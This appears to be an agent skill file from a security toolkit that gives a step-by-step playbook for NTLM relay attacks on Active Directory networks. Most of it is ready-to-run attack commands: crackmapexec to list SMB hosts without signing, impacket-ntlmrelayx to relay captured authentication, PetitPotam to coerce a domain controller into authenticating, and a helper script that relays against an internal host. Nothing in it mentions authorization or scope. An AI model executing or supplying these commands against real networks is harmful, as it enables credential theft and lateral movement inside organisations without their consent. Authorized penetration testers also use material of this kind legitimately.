<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: performing-ntlm-relay-attacks
description: >-
  Execute NTLM relay attacks to capture and relay authentication to target services, exploiting unsigned SMB, LDAP, and HTTP endpoints for lateral movement.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - ntlm-relay
  - smb-signing
  - coercion
  - lateral-movement
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1557.001"]
  frameworks: ["MITRE ATT&CK"]
  tools: ["impacket", "responder", "petitpotam"]
---

# Performing Ntlm Relay Attacks

## Overview

Execute NTLM relay attacks to capture and relay authentication to target services, exploiting unsigned SMB, LDAP, and HTTP endpoints for lateral movement.

## Prerequisites

- Tools: `impacket`, `responder`, `petitpotam`
- Impacket ntlmrelayx, Responder, network access to target segment

## Quick Reference

```bash
# Quick start commands
python3 scripts/agent.py --help
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
```

## Workflow

### Step 1: Check SMB Signing

```bash
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
```

### Step 2: Start NTLM Relay

```bash
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

### Step 3: Coerce Authentication

```bash
python3 PetitPotam.py listener_ip target_dc
```


## Verification

- **Verify relay targets**: `python3 scripts/agent.py scan --subnet 10.0.0.0/24`
- **Confirm relay success**: `python3 scripts/agent.py relay --target 10.0.0.5`

## References

- MITRE ATT&CK: T1557.001
- Frameworks: MITRE ATT&CK
- Tools: impacket, responder, petitpotam
